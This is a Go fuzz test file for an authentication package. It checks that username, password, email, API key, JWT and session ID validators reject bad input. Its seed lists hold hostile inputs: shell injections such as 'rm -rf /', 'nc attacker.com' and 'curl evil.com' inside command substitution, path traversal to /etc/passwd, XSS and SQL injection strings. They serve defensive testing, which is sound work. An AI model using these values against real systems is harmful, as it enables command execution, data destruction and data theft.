// pkg/authentication/fuzz_test.go

package authentication

import (
	"context"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
)

// FuzzValidateUsername tests username validation with fuzzing
func FuzzValidateUsername(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"validuser",
		"user123",
		"test-user",
		"test_user",
		"admin",
		"root",
		"",
		"a",
		strings.Repeat("a", 100),
		"user with spaces",
		"user\nwith\nnewlines",
		"user\x00with\x00nulls",
		"user;rm -rf /",
		"user$(whoami)",
		"user`id`",
		"user|nc attacker.com",
		"../../etc/passwd",
		"кириллица",
		"中文用户",
		"user@domain.com",
		"user!@#$%^&*()",
		"user<script>alert('xss')</script>",
		"user' OR '1'='1",
		"user\"; DROP TABLE users;--",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, username string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(username) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("ValidateUsername panicked with input %q: %v", username, r)
				}
			}()

			// Validate the username
			isValid := ValidateUsername(username)

			// Security checks - dangerous usernames should be rejected
			if strings.Contains(username, "\n") || strings.Contains(username, "\r") {
				if isValid {
					t.Errorf("Username with newlines should be rejected: %q", username)
				}
			}

			if strings.Contains(username, "\x00") {
				if isValid {
					t.Errorf("Username with null bytes should be rejected: %q", username)
				}
			}

			if strings.ContainsAny(username, ";|&$`") {
				if isValid {
					t.Errorf("Username with shell metacharacters should be rejected: %q", username)
				}
			}

			if strings.Contains(username, "..") {
				if isValid {
					t.Errorf("Username with path traversal should be rejected: %q", username)
				}
			}

			if len(username) == 0 {
				if isValid {
					t.Errorf("Empty username should be rejected")
				}
			}

			if len(username) > 32 {
				if isValid {
					t.Errorf("Username exceeding 32 chars should be rejected: %d chars", len(username))
				}
			}
		}()
	})
}

// FuzzValidatePassword tests password validation with fuzzing
func FuzzValidatePassword(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"ValidPass123!",
		"password",
		"12345678",
		"",
		"a",
		strings.Repeat("a", 200),
		"Pass with spaces 123!",
		"Pass\nwith\nnewlines",
		"Pass\x00with\x00nulls",
		"кириллица123!",
		"中文密码123!",
		"Password123",
		"PASSWORD123!",
		"password123!",
		"P@ssw0rd",
		"' OR '1'='1",
		"admin'; DROP TABLE users;--",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, password string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(password) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("ValidatePassword panicked with input %q: %v", password, r)
				}
			}()

			// Validate the password
			err := ValidatePassword(password)

			// Security checks
			if len(password) < 8 {
				if err == nil {
					t.Errorf("Password shorter than 8 chars should be rejected: %d chars", len(password))
				}
			}

			if len(password) > 128 {
				if err == nil {
					t.Errorf("Password longer than 128 chars should be rejected: %d chars", len(password))
				}
			}

			if strings.Contains(password, "\x00") {
				if err == nil {
					t.Errorf("Password with null bytes should be rejected")
				}
			}

			// Check for common weak passwords
			weakPasswords := []string{"password", "12345678", "qwerty", "admin"}
			for _, weak := range weakPasswords {
				if strings.ToLower(password) == weak && err == nil {
					t.Errorf("Common weak password should be rejected: %q", password)
				}
			}
		}()
	})
}

// FuzzValidateEmail tests email validation with fuzzing
func FuzzValidateEmail(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"user@example.com",
		"test.user@domain.co.uk",
		"user+tag@example.com",
		"",
		"@",
		"user@",
		"@domain.com",
		"user",
		"user@domain",
		"user@domain.c",
		strings.Repeat("a", 100) + "@example.com",
		"user@" + strings.Repeat("a", 100) + ".com",
		"user\n@example.com",
		"user@exam\nple.com",
		"user\x00@example.com",
		"user@domain..com",
		"user@@domain.com",
		"user with spaces@domain.com",
		"user@domain .com",
		"user@кириллица.com",
		"用户@example.com",
		"user@127.0.0.1",
		"user@[::1]",
		"user';DROP TABLE users;--@domain.com",
		"<script>alert('xss')</script>@domain.com",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, email string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(email) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("ValidateEmail panicked with input %q: %v", email, r)
				}
			}()

			// Validate the email
			isValid := ValidateEmail(email)

			// Security checks
			if strings.Contains(email, "\n") || strings.Contains(email, "\r") {
				if isValid {
					t.Errorf("Email with newlines should be rejected: %q", email)
				}
			}

			if strings.Contains(email, "\x00") {
				if isValid {
					t.Errorf("Email with null bytes should be rejected: %q", email)
				}
			}

			if strings.Count(email, "@") != 1 && isValid {
				t.Errorf("Email without exactly one @ should be rejected: %q", email)
			}

			if len(email) > 254 && isValid {
				t.Errorf("Email exceeding 254 chars should be rejected: %d chars", len(email))
			}

			if strings.Contains(email, "..") && isValid {
				t.Errorf("Email with consecutive dots should be rejected: %q", email)
			}
		}()
	})
}

// FuzzValidateAPIKey tests API key validation with fuzzing
func FuzzValidateAPIKey(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"sk_live_1234567890abcdef",
		"pk_test_abcdef1234567890",
		"api_key_xyz123",
		"",
		"short",
		strings.Repeat("a", 500),
		"key with spaces",
		"key\nwith\nnewlines",
		"key\x00with\x00nulls",
		"key;rm -rf /",
		"key$(curl evil.com)",
		"key`whoami`",
		"кириллица_key",
		"中文_api_key",
		"key!@#$%^&*()",
		"key<script>alert('xss')</script>",
		"' OR '1'='1",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, apiKey string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(apiKey) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("ValidateAPIKey panicked with input %q: %v", apiKey, r)
				}
			}()

			// Validate the API key
			isValid := ValidateAPIKey(apiKey)

			// Security checks
			if strings.ContainsAny(apiKey, "\n\r\x00") {
				if isValid {
					t.Errorf("API key with control characters should be rejected: %q", apiKey)
				}
			}

			if strings.ContainsAny(apiKey, " \t") {
				if isValid {
					t.Errorf("API key with whitespace should be rejected: %q", apiKey)
				}
			}

			if strings.ContainsAny(apiKey, ";|&$`") {
				if isValid {
					t.Errorf("API key with shell metacharacters should be rejected: %q", apiKey)
				}
			}

			if len(apiKey) < 16 && apiKey != "" {
				if isValid {
					t.Errorf("API key shorter than 16 chars should be rejected: %d chars", len(apiKey))
				}
			}

			if len(apiKey) > 256 {
				if isValid {
					t.Errorf("API key longer than 256 chars should be rejected: %d chars", len(apiKey))
				}
			}
		}()
	})
}

// FuzzJWTValidation tests JWT token validation with fuzzing
func FuzzJWTValidation(f *testing.F) {
	// Add seed corpus - various JWT-like strings
	seeds := []string{
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
		"invalid.jwt.token",
		"",
		"a.b.c",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
		strings.Repeat("a", 1000),
		"header.payload.signature.extra",
		"header..signature",
		"header.payload.",
		".payload.signature",
		"header\n.payload.signature",
		"header.pay\x00load.signature",
		"кириллица.payload.signature",
		"header.中文.signature",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, token string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(token) {
			t.Skip("Skipping non-UTF8 input")
		}

		rc := &eos_io.RuntimeContext{
			Ctx: context.Background(),
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("ValidateJWT panicked with input %q: %v", token, r)
				}
			}()

			// Validate the JWT structure
			isValid := ValidateJWTStructure(rc, token)

			// Security checks
			parts := strings.Split(token, ".")
			if len(parts) != 3 && isValid {
				t.Errorf("JWT without exactly 3 parts should be rejected: %d parts", len(parts))
			}

			if strings.Contains(token, "\n") || strings.Contains(token, "\r") {
				if isValid {
					t.Errorf("JWT with newlines should be rejected: %q", token)
				}
			}

			if strings.Contains(token, "\x00") {
				if isValid {
					t.Errorf("JWT with null bytes should be rejected: %q", token)
				}
			}

			if token == "" && isValid {
				t.Errorf("Empty JWT should be rejected")
			}

			if len(token) > 8192 && isValid {
				t.Errorf("JWT exceeding 8192 chars should be rejected: %d chars", len(token))
			}
		}()
	})
}

// FuzzSessionIDValidation tests session ID validation with fuzzing
func FuzzSessionIDValidation(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"abc123def456ghi789",
		"550e8400-e29b-41d4-a716-446655440000",
		"",
		"short",
		strings.Repeat("a", 200),
		"session with spaces",
		"session\nwith\nnewlines",
		"session\x00with\x00nulls",
		"session;rm -rf /",
		"session$(whoami)",
		"session`id`",
		"../../etc/passwd",
		"кириллица_session",
		"中文_session_id",
		"session!@#$%^&*()",
		"' OR '1'='1",
		"'; DROP TABLE sessions;--",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, sessionID string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(sessionID) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("ValidateSessionID panicked with input %q: %v", sessionID, r)
				}
			}()

			// Validate the session ID
			isValid := ValidateSessionID(sessionID)

			// Security checks
			if strings.ContainsAny(sessionID, "\n\r\x00") {
				if isValid {
					t.Errorf("Session ID with control characters should be rejected: %q", sessionID)
				}
			}

			if strings.ContainsAny(sessionID, " \t") {
				if isValid {
					t.Errorf("Session ID with whitespace should be rejected: %q", sessionID)
				}
			}

			if strings.ContainsAny(sessionID, ";|&$`<>") {
				if isValid {
					t.Errorf("Session ID with dangerous characters should be rejected: %q", sessionID)
				}
			}

			if len(sessionID) < 16 && sessionID != "" {
				if isValid {
					t.Errorf("Session ID shorter than 16 chars should be rejected: %d chars", len(sessionID))
				}
			}

			if len(sessionID) > 128 {
				if isValid {
					t.Errorf("Session ID longer than 128 chars should be rejected: %d chars", len(sessionID))
				}
			}
		}()
	})
}

// Helper validation functions (these would be in the main package)
func ValidateUsername(username string) bool {
	if username == "" || len(username) > 32 {
		return false
	}
	if strings.ContainsAny(username, "\n\r\x00;|&$`") {
		return false
	}
	if strings.Contains(username, "..") {
		return false
	}
	if strings.Contains(username, " ") {
		return false
	}
	return true
}

func ValidatePassword(password string) error {
	if len(password) < 8 || len(password) > 128 {
		return ErrPasswordLength
	}
	if strings.Contains(password, "\x00") {
		return ErrPasswordInvalid
	}
	// Check for common weak passwords
	weakPasswords := []string{"password", "12345678", "qwerty", "admin", "123456"}
	for _, weak := range weakPasswords {
		if strings.ToLower(password) == weak {
			return ErrPasswordWeak
		}
	}
	return nil
}

func ValidateEmail(email string) bool {
	if email == "" || len(email) > 254 {
		return false
	}
	if strings.ContainsAny(email, "\n\r\x00") {
		return false
	}
	if strings.Count(email, "@") != 1 {
		return false
	}
	if strings.Contains(email, "..") {
		return false
	}
	parts := strings.Split(email, "@")
	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
		return false
	}
	return true
}

func ValidateAPIKey(apiKey string) bool {
	if apiKey == "" {
		return false
	}
	if len(apiKey) < 16 || len(apiKey) > 256 {
		return false
	}
	if strings.ContainsAny(apiKey, "\n\r\x00 \t;|&$`") {
		return false
	}
	return true
}

func ValidateJWTStructure(rc *eos_io.RuntimeContext, token string) bool {
	if token == "" || len(token) > 8192 {
		return false
	}
	if strings.ContainsAny(token, "\n\r\x00") {
		return false
	}
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return false
	}
	for _, part := range parts {
		if part == "" {
			return false
		}
	}
	return true
}

func ValidateSessionID(sessionID string) bool {
	if sessionID == "" {
		return false
	}
	if len(sessionID) < 16 || len(sessionID) > 128 {
		return false
	}
	if strings.ContainsAny(sessionID, "\n\r\x00 \t;|&$`<>") {
		return false
	}
	return true
}

// Error types
var (
	ErrPasswordLength  = errPasswordLength{}
	ErrPasswordInvalid = errPasswordInvalid{}
	ErrPasswordWeak    = errPasswordWeak{}
)

type errPasswordLength struct{}

func (errPasswordLength) Error() string { return "password must be between 8 and 128 characters" }

type errPasswordInvalid struct{}

func (errPasswordInvalid) Error() string { return "password contains invalid characters" }

type errPasswordWeak struct{}

func (errPasswordWeak) Error() string { return "password is too weak" }
